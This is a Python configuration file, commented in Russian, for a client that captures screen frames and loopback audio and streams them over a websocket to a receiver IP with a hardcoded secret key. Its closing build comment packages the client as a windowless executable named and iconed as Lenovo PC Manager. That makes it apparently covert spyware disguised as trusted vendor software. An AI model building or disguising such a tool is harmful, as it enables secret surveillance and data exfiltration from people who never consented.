# --- Адрес сервера Получателя ---
# Замени на РЕАЛЬНЫЙ ЛОКАЛЬНЫЙ IP-адрес компьютера друга
RECEIVER_IP = "82.202.140.243" # Пример! Узнать через ipconfig/ip addr
RECEIVER_IP = "127.0.0.1" # Пример! Узнать через ipconfig/ip addr
RECEIVER_PORT = 8000
WEBSOCKET_SECRET_KEY = 'SkRt}X–d/;,$GM*–qi(Uz!LG1(#H#ZbfN3c/&y78USiv[MannL}@7_MO=GdF8–k'

# --- Настройки видео ---
FRAME_RATE = 10  # Кадров в секунду
VIDEO_QUALITY = 30 # Качество JPEG (1-100)
MONITOR_NUM = 1 # Номер монитора для захвата

# --- Настройки аудио ---
# Укажи ТОЧНОЕ имя loopback устройства (VB-CABLE, Monitor of..., BlackHole)
AUDIO_DEVICE_NAME = 'микшер' # Пример для Windows
SAMPLE_RATE = 16000 # Должно совпадать с настройками сервера!
CHANNELS = 1
# Размер блока аудио для отправки (в секундах) - влияет на задержку
AUDIO_CHUNK_DURATION = 0.2 # Отправляем каждые 0.2 секунды

# pyinstaller --onefile --noconsole --icon=lenovo.ico --name=联想电脑管家 --version-file=version_info.txt source_client.py
